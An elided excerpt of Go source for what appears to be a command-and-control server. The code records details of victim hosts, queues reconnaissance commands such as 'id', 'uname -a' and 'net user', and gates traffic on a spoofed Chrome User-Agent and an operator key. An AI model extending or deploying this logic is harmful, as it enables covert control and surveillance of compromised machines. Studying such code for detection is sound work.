...
func createClientDBQuery(r registerInfo, u string, path string) {
	...
	query := "INSERT INTO clients (uuid, osInfo, osWorkingDirectory, osHostname, Username, UserHomeDirectory, UserGID, UserUID, IPAddresses, MACAddresses) "
	query += "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
	stmt, err := db.Prepare(query)
	cf.CheckError("Unable to prepare the insert query", err, true)
	defer stmt.Close()

	_, err = stmt.Exec(u, r.OSInfo, r.OSWorkingDirectory, r.OSHostname, r.Username, r.UserHomeDirectory, r.UserGID, r.UserUID, r.IPAddresses, r.MACAddresses)
	...
	if r.OSInfo == "linux" {
		linuxCommandsSlice := []string{"ls", "id", "uname -a"}
		...
		windowsCommandsSlice := []string{"dir", "net user", "whoami"}
	...
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		...
		if opStruct.OperatorName != "" {
			...
			if cf.CalcSHA256Hash(operatorKey) == cf.CalcSHA256Hash(opStruct.OperatorKey) {
				...
				queryClients := "SELECT uuid FROM clients"
...
func saveResults(w http.ResponseWriter, r *http.Request, path string) {
	...
	if r.Method == "POST" {
		...
		if cmdStruct.CommandID != "" {
			...
			_, err = updateStmt.Exec(encodedResults, timestamp, intCommandID, string(decodedCommand))
...
func gatherInfo(w http.ResponseWriter, r *http.Request, dbPath string) {
	...
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		...
		if authSessionStatus == "Authenticated" {
			...
			rowCount := 0
			for rows.Next() {
				err := rows.Scan(&cmdStruct.CommandID, &cmdStruct.Command, &cmdStruct.Results, &cmdStruct.TSResultsReturned)
